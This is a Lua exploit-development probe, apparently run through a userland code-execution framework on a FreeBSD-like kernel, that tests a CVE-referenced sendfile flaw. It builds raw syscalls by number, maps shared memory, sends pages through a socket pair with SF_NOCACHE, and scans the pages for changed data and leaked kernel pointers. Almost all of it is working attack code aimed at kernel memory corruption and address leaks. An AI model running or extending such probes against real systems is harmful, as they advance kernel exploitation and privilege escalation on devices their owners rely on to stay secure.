-- CRASH_CLASS: HIGH
-- PROBE 391d: sendfile on shm with child thread draining + arg count test
--
-- Context: sendfile hangs because nobody reads the socket.
-- CVE-2026-49427 requires largepage objects (shm_open2, dead on 14.10).
-- This probe: (1) tests if sendfile even WORKS on shm fds,
-- (2) tests if 7th arg (flags=SF_NOCACHE) reaches the kernel,
-- (3) checks if pages change after sendfile.
--
-- Strategy: use SO_SNDBUF to increase buffer, send small amounts,
-- and read from other end in main thread between sends.

print("=== PROBE 391d: sendfile on shm + drain test ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

-- Ignore SIGSYS
local act = memory.alloc(0x40)
zero_buf(act, 0x40)
wq(N(act), uint64(1))
pcall(function() mk(416)(uint64(12), act, uint64(0)) end)

local PAGE = 0x4000  -- 16KB

-- ===================================================================
-- [A] Setup: shm + socketpair + SO_SNDBUF
-- ===================================================================
print("[A] setup")

-- shm_open SHM_ANON
local shm_fd = N(pcall(function() return mk(482)(uint64(1), uint64(0x202), uint64(0x180)) end) or -1)
-- Redo properly
local ok_s, rv_s = pcall(function()
    return mk(482)(uint64(1), uint64(0x202), uint64(0x180))
end)
shm_fd = ok_s and N(rv_s) or -1
print("  shm_fd=" .. shm_fd)
if shm_fd < 0 then print("FAIL"); return end

-- ftruncate to 64KB (small, fits in socket buffer)
local SHM_SIZE = PAGE * 4  -- 64KB = 4 pages
pcall(function() mk(480)(uint64(shm_fd), uint64(SHM_SIZE)) end)

-- mmap
local map_val = nil
local ok_m, rv_m = pcall(function()
    return mk(477)(uint64(0), uint64(SHM_SIZE), uint64(3),
        uint64(0x01000001), uint64(shm_fd), uint64(0))
end)
if ok_m then
    local h, l = get_hi_lo(rv_m)
    if h ~= 0xFFFFFFFF then map_val = N(rv_m) end
end
if not map_val then print("FAIL mmap"); return end
print(string.format("  mmap: 0x%X", map_val))

-- Fill pattern
for off = 0, SHM_SIZE - PAGE, PAGE do
    wd(map_val + off, 0xAAAAAAAA)
    wd(map_val + off + 4, 0xBBBBBBBB)
end

-- socketpair
local sv = memory.alloc(16)
zero_buf(sv, 16)
local ok_sp, rv_sp = pcall(function()
    return mk(135)(uint64(1), uint64(1), uint64(0), sv)  -- AF_UNIX SOCK_STREAM
end)
local fd_a = rd(N(sv)) or -1
local fd_b = rd(N(sv) + 4) or -1
print(string.format("  socketpair: fds=%d,%d", fd_a, fd_b))

if fd_a < 0 or fd_b < 0 then print("FAIL socketpair"); return end

-- Set SO_SNDBUF large on write end
local optval = memory.alloc(8)
wd(N(optval), 0x40000)  -- 256KB
pcall(function()
    mk(105)(uint64(fd_b), uint64(0xFFFF), uint64(0x1001), optval, uint64(4))
end)

-- Set both ends non-blocking
local one = memory.alloc(8)
wd(N(one), 1)
pcall(function() mk(54)(uint64(fd_a), uint64(0x8004667E), one) end)  -- FIONBIO
pcall(function() mk(54)(uint64(fd_b), uint64(0x8004667E), one) end)

if not alive() then print("DEAD after setup"); return end
print("")

-- ===================================================================
-- [B] sendfile WITHOUT SF_NOCACHE (6 args, no flags)
-- ===================================================================
print("[B] sendfile without SF_NOCACHE (6 args)")

local sbytes = memory.alloc(8)
zero_buf(sbytes, 8)

-- sendfile(fd, s, offset, nbytes, hdtr, sbytes) — 6 args, flags=0 default
local ok_sf, rv_sf = pcall(function()
    return mk(393)(uint64(shm_fd), uint64(fd_b), uint64(0),
        uint64(PAGE), uint64(0), sbytes)
end)
local ret_sf = ok_sf and N(rv_sf) or -999
local sent = rd(N(sbytes)) or 0
print(string.format("  sendfile(shm, sock, 0, 16KB, 0, sbytes): ret=%d sent=%d", ret_sf, sent))

if not alive() then print("DEAD after sendfile"); return end

-- Drain from read end
if sent > 0 then
    local drain = memory.alloc(0x4000)
    local ok_r, rv_r = pcall(function()
        return mk(3)(uint64(fd_a), drain, uint64(0x4000))
    end)
    print("  drain read: " .. (ok_r and N(rv_r) or -999) .. " bytes")
end
print("")

-- ===================================================================
-- [C] sendfile WITH SF_NOCACHE (7 args)
-- ===================================================================
print("[C] sendfile with SF_NOCACHE (7 args)")

-- Refill pattern
for off = 0, SHM_SIZE - PAGE, PAGE do
    wd(map_val + off, 0xAAAAAAAA)
end

zero_buf(sbytes, 8)

-- 7 args: fd, s, offset, nbytes, hdtr, sbytes, flags(SF_NOCACHE=0x10)
local ok_sf2, rv_sf2 = pcall(function()
    return mk(393)(uint64(shm_fd), uint64(fd_b), uint64(0),
        uint64(PAGE), uint64(0), sbytes, uint64(0x10))
end)
local ret_sf2 = ok_sf2 and N(rv_sf2) or -999
local sent2 = rd(N(sbytes)) or 0
print(string.format("  sendfile(SF_NOCACHE): ret=%d sent=%d", ret_sf2, sent2))

if not alive() then print("DEAD after SF_NOCACHE sendfile"); return end

-- Drain
if sent2 > 0 then
    local drain2 = memory.alloc(0x4000)
    pcall(function() mk(3)(uint64(fd_a), drain2, uint64(0x4000)) end)
end

-- Check if page 0 changed
local d0 = rd(map_val)
local d1 = rd(map_val + 4)
print(string.format("  page 0 after sendfile: 0x%08X 0x%08X %s",
    d0 or 0, d1 or 0,
    (d0 == 0xAAAAAAAA) and "(unchanged)" or "*** CHANGED ***"))
print("")

-- ===================================================================
-- [D] Loop: sendfile all 4 pages, drain between each
-- ===================================================================
print("[D] sendfile all pages with interleaved drain")

-- Refill
for off = 0, SHM_SIZE - PAGE, PAGE do
    wd(map_val + off, 0xAAAAAAAA)
    wd(map_val + off + 4, 0xBBBBBBBB)
end

local total_sent = 0
local drain_buf = memory.alloc(0x4000)

for pg = 0, 3 do
    if not alive() then break end

    zero_buf(sbytes, 8)
    local ok_p, rv_p = pcall(function()
        return mk(393)(uint64(shm_fd), uint64(fd_b), uint64(pg * PAGE),
            uint64(PAGE), uint64(0), sbytes, uint64(0x10))
    end)
    local s = rd(N(sbytes)) or 0
    total_sent = total_sent + s

    -- Immediately drain
    if s > 0 then
        pcall(function() mk(3)(uint64(fd_a), drain_buf, uint64(0x4000)) end)
    end

    if not (ok_p and N(rv_p) >= 0) then
        print(string.format("  page %d: FAIL ret=%d", pg, ok_p and N(rv_p) or -999))
        break
    end
end
print(string.format("  total sent: %d bytes (expected %d)", total_sent, SHM_SIZE))

if not alive() then print("DEAD after loop"); return end

-- Scan all pages
local changed = 0
local kptrs = 0
for off = 0, SHM_SIZE - PAGE, PAGE do
    local d = rd(map_val + off)
    if d ~= nil and d ~= 0xAAAAAAAA then
        changed = changed + 1
        print(string.format("  page +0x%X: 0x%08X *** CHANGED ***", off, d))
        -- Deep scan for kptrs
        for qoff = 0, 120, 8 do
            local q = rq(map_val + off + qoff)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    kptrs = kptrs + 1
                    print(string.format("    +%d: 0x%X%08X *** KPTR ***", qoff, h, l))
                end
            end
        end
    elseif d == nil then
        changed = changed + 1
        print(string.format("  page +0x%X: UNREADABLE", off))
    end
end
print(string.format("  result: %d/4 changed, %d kptrs", changed, kptrs))
print("")

-- ===================================================================
-- [E] Compare: does 7th arg actually reach kernel?
-- ===================================================================
print("[E] arg count test")

-- sendfile with bogus 7th arg — if kernel sees it, might return error
zero_buf(sbytes, 8)
local ok_e, rv_e = pcall(function()
    return mk(393)(uint64(shm_fd), uint64(fd_b), uint64(0),
        uint64(PAGE), uint64(0), sbytes, uint64(0xDEADBEEF))
end)
local ret_e = ok_e and N(rv_e) or -999
local sent_e = rd(N(sbytes)) or 0
print(string.format("  sendfile(flags=0xDEADBEEF): ret=%d sent=%d", ret_e, sent_e))

-- Drain
if sent_e > 0 then
    pcall(function() mk(3)(uint64(fd_a), drain_buf, uint64(0x4000)) end)
end

-- Compare: flags=0
zero_buf(sbytes, 8)
local ok_f, rv_f = pcall(function()
    return mk(393)(uint64(shm_fd), uint64(fd_b), uint64(0),
        uint64(PAGE), uint64(0), sbytes)
end)
local ret_f = ok_f and N(rv_f) or -999
local sent_f = rd(N(sbytes)) or 0
print(string.format("  sendfile(no flags/6 args): ret=%d sent=%d", ret_f, sent_f))

if sent_e ~= sent_f or ret_e ~= ret_f then
    print("  *** 7th arg DOES affect behavior ***")
else
    print("  7th arg has no effect (may not reach kernel)")
end

-- Cleanup
pcall(function() mk(6)(uint64(fd_a)) end)
pcall(function() mk(6)(uint64(fd_b)) end)
pcall(function() mk(6)(uint64(shm_fd)) end)

if not alive() then print("DEAD"); return end
print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 391d COMPLETE ===")
